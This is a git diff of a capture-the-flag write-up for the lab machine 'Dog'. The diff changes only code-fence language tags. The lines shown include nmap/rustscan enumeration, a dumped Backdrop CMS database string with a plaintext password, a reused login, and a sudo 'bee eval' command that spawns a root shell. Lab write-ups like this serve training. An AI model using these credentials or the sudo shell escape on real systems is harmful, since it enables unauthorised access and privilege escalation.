@@ -23,7 +23,7 @@ cover:
 
 ## Enumeration
 
-```
+```jsx
 nmap -sVC 10.10.11.58             
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-09 11:37 +0545
 Nmap scan report for 10.10.11.58 (10.10.11.58)
@@ -61,7 +61,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 31.50 seconds
 ```
 
-```
+```jsx
 rustscan -a 10.10.11.58             
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -108,7 +108,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
 ![](Pasted%20image%2020250309114042.png)
 
 Contents of robots.txt.
-```
+```txt
 #
 # robots.txt
 #
@@ -162,7 +162,7 @@ And lots of things in directory busting.
 
 And the directories and queries from robots.txt in not valid.
 
-```
+```bash
 admin/config/development/configuration/sync
 ```
 
@@ -172,7 +172,7 @@ We can use [GitTools](https://github.com/internetwache/GitTools) to dump data an
 
 `BackDropJ2024DS2024`
 
-```
+```mysql
 $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
 $database_prefix = '';
 
@@ -186,7 +186,7 @@ And can find email.
 And we logged in.
 ![](Pasted%20image%2020250309140657.png)
 
-```
+```txt
 tiffany@dog.htb
 BackDropJ2024DS2024
 ```
@@ -262,7 +262,7 @@ Lets try.
 We have to also write commands inside quotations. 
 ![](Pasted%20image%2020250309163909.png)
 
-```
+```bash
 sudo /usr/local/bin/bee --root=/var/www/html eval 'system("/bin/bash");'
 
 ```
